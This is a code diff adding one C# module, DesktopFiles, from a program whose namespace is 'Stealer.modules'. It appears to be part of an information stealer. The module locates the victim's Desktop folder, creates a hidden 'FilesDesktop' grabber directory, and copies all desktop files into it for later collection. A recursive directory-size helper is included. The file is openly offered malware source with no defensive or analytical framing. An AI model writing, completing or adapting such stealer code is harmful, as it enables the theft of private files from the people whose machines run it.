@@ -1,0 +1,49 @@
+﻿using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class DesktopFiles
+  {
+    private static string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+    private static string GrabberDir = Program.path + "\\FilesDesktop\\";
+
+    private static long GetDirSize(string path, long size = 0)
+    {
+      try
+      {
+        foreach (string enumerateFile in Directory.EnumerateFiles(path))
+        {
+          try
+          {
+            size += new FileInfo(enumerateFile).Length;
+          }
+          catch
+          {
+          }
+        }
+        foreach (string enumerateDirectory in Directory.EnumerateDirectories(path))
+        {
+          try
+          {
+            size += DesktopFiles.GetDirSize(enumerateDirectory, 0L);
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+      return size;
+    }
+
+    public static void Inizialize()
+    {
+      if (!File.Exists(DesktopFiles.GrabberDir))
+        Directory.CreateDirectory(DesktopFiles.GrabberDir);
+      USB.CopyDisk(DesktopFiles.DesktopPath, DesktopFiles.GrabberDir);
+    }
+  }
+}
